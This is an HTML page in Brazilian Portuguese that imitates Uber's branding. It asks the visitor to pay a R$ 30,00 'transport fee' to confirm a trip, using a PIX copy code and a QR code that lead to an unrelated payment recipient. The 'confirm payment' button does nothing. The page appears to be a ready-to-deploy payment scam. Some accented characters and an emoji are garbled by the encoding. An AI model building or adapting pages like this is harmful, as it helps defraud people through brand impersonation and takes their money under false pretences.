<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Pagamento da Taxa | Uber</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #000000 0%, #444444 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      animation: fadeIn 1s ease;
      color: #eee;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .container {
      background: #111;
      padding: 30px 25px;
      max-width: 400px;
      width: 100%;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(255, 255, 255, 0.15);
      text-align: center;
      animation: popUp 0.8s ease;
      color: #eee;
    }

    @keyframes popUp {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .logo {
      font-size: 28px;
      font-weight: 700;
      color: #fff;
      margin-bottom: 5px;
      text-shadow: 0 0 4px #fff;
    }

    .subtitle {
      color: #ccc;
      font-size: 15px;
      margin-bottom: 25px;
    }

    .amount {
      font-size: 32px;
      font-weight: bold;
      color: #fff;
      margin-bottom: 16px;
    }

    .pix-box {
      background: #222;
      padding: 12px;
      border-radius: 10px;
      font-size: 13px;
      word-break: break-word;
      color: #ddd;
      margin-bottom: 10px;
      animation: fadeIn 1s ease 0.5s both;
      user-select: all;
    }

    .btn-copy {
      background: #444;
      color: #eee;
      border: none;
      padding: 10px 18px;
      border-radius: 10px;
      font-size: 14px;
      cursor: pointer;
      font-weight: 600;
      box-shadow: 0 4px 12px rgba(255, 255, 255, 0.1);
      transition: transform 0.2s ease, background-color 0.3s ease;
    }

    .btn-copy:hover {
      background: #666;
      transform: scale(1.05);
    }

    .qrcode {
      width: 180px;
      margin: 25px auto 15px;
      display: block;
      border-radius: 12px;
      transition: transform 0.3s ease;
      animation: pulse 2s infinite;
      filter: grayscale(100%);
      background: #fff;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    .btn-confirm {
      background: #000;
      color: #eee;
      border: 2px solid #eee;
      padding: 14px 20px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
      transition: transform 0.2s ease, box-shadow 0.2s ease, background-color 0.3s ease;
    }

    .btn-confirm:hover {
      background: #222;
      box-shadow: 0 8px 20px rgba(255, 255, 255, 0.2);
      transform: scale(1.03);
    }

    .copiado-msg {
      margin-top: 8px;
      font-size: 13px;
      color: #bbb;
      display: none;
    }

    @media (max-width: 420px) {
      .container {
        margin: 20px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">UBER</div>
    <div class="subtitle">Para confirmar sua viagem, realize o pagamento da taxa de transporte:</div>

    <div class="amount">R$ 30,00</div>

    <div id="pixCode" class="pix-box">
      00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/d18098e4ad4b4366912e6bcb1c60ef8c5204000053039865802BR5905EFISA6008SAOPAULO62070503***630492D4
    </div>

    <button class="btn-copy" onclick="copiarPix()">ðŸ“‹ Copiar cÃ³digo PIX</button>
    <div id="copiadoMsg" class="copiado-msg">CÃ³digo copiado com sucesso!</div>

    <img class="qrcode" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/d18098e4ad4b4366912e6bcb1c60ef8c5204000053039865802BR5905EFISA6008SAOPAULO62070503***630492D4" alt="QR Code Pix">

    <button class="btn-confirm" onclick="window.location.href='#'">Confirmar Pagamento</button>
  </div>

  <script>
    function copiarPix() {
      const code = document.getElementById("pixCode").innerText;
      navigator.clipboard.writeText(code).then(() => {
        const msg = document.getElementById("copiadoMsg");
        msg.style.display = 'block';
        setTimeout(() => {
          msg.style.display = 'none';
        }, 3000);
      });
    }
  </script>

</body>
</html>
